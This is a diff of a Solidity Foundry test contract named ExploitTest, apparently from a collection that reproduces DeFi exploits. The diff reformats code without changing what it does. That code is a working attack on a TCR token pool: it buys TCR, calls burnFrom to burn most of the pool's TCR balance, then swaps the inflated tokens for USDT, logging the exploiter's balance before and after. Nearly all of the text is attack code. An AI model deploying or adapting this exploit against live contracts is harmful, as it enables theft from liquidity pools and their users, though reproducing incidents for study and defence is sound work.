@@ -71,7 +71,9 @@ contract ExploitTest is Test {
         ITcrInterface(TCR).approve(pool, type(uint256).max);
 
         emit log_named_decimal_uint(
-            "Exploiter USDT balance before attack", IERC20(usdt).balanceOf(address(this)), IERC20(usdt).decimals()
+            "Exploiter USDT balance before attack",
+            IERC20(usdt).balanceOf(address(this)),
+            IERC20(usdt).decimals()
         );
         uint256 wethAmount = address(this).balance;
         address[] memory path = new address[](3);
@@ -80,7 +82,12 @@ contract ExploitTest is Test {
         path[2] = TCR;
         uint256 deadline = block.timestamp + 24 hours;
 
-        IUNIswapV2(route).swapExactETHForTokens{value: wethAmount}(1, path, address(this), deadline);
+        IUNIswapV2(route).swapExactETHForTokens{value: wethAmount}(
+            1,
+            path,
+            address(this),
+            deadline
+        );
         uint256 poolTCRbalance = IERC20(TCR).balanceOf(pool);
         ITcrInterface(TCR).burnFrom(pool, poolTCRbalance - 100_000_000);
         uint256 attackerTCRbalance = IERC20(TCR).balanceOf(address(this));
@@ -88,10 +95,18 @@ contract ExploitTest is Test {
         address[] memory path2 = new address[](2);
         path2[0] = TCR;
         path2[1] = usdt;
-        IUNIswapV2(route).swapExactTokensForTokens(attackerTCRbalance, 1, path2, address(this), deadline);
+        IUNIswapV2(route).swapExactTokensForTokens(
+            attackerTCRbalance,
+            1,
+            path2,
+            address(this),
+            deadline
+        );
 
         emit log_named_decimal_uint(
-            "Exploiter USDT balance after attack", IERC20(usdt).balanceOf(address(this)), IERC20(usdt).decimals()
+            "Exploiter USDT balance after attack",
+            IERC20(usdt).balanceOf(address(this)),
+            IERC20(usdt).decimals()
         );
     }
 }
